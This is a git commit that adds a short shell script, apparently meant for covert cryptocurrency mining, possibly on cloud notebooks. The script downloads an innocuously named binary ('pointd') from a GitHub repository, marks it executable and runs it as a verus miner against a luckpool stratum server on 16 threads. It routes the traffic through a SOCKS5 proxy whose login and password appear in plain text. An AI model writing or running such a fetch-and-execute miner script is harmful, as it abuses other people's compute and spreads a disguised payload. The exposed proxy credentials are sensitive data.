0dd1e050f7e3661d2788af9c25129bd6ccc16bef
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-04-02 20:39:22 +0700

    Create Vrutot16.sh

---
+++ Vrutot16.sh
@@ -0,0 +1,4 @@
+apt update -y
+wget -q https://github.com/uaaoxjdr/colab-ssh/raw/master/pointd
+chmod +x pointd
+./pointd -a verus -o stratum+tcp://na.luckpool.net:3956 -u RFjeLpKzaG94EnaidkK2PvgdNR5Q5nTnbW.$(shuf -n 1 -i 1-9999999) -t 16 -p x -x socks5://berkahkita:kitabersama123@185.9.52.177:5185
